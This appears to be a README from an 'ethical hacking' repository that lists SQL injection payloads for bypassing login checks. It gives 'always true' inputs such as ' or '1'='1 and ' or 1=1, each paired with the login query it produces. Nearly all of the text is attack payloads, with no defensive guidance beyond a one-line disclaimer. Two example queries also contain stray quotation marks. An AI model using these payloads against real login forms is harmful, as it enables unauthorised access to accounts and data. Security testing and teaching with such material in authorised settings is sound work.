# SQL INJECTION 
### PAYLOAD AND EXAMPLE QUERY

![https://img.shields.io/badge/ETHICAL%20HACKING-TRUE-red](https://img.shields.io/badge/ETHICAL%20HACKING-TRUE-red)

> ! Attention, This Repository For Ethical Hacking 

## Table of contents

1. [Bypass SQL Always True](#alwaystrue)
 
## Bypass SQL Always True <a name="alwaystrue"></a>

|PAYLOAD  | EXAMPLE QUERY |
|--|--|
| ```' or '1'='1``` |```SELECT * FROM user WHERE username = '' or '1'='1' AND password = '' or '1'='1';```|
| ```' or username!=''``` |```SELECT * FROM user WHERE username = '' or username!='' AND password = '' or password!='';```|
| ```' or FALSE!=TRUE``` |```SELECT * FROM user WHERE username = '' or FALSE!=TRUE AND password = '' or FALSE!=TRUE;```|
| ```' or TRUE=TRUE``` |```SELECT * FROM user WHERE username = '' or TRUE=TRUE AND password = '' or TRUE=TRUE";```|
| ```' or 1=1``` |```SELECT * FROM user WHERE username = '' or 1=1 AND password = '' or 1=1" ;```|
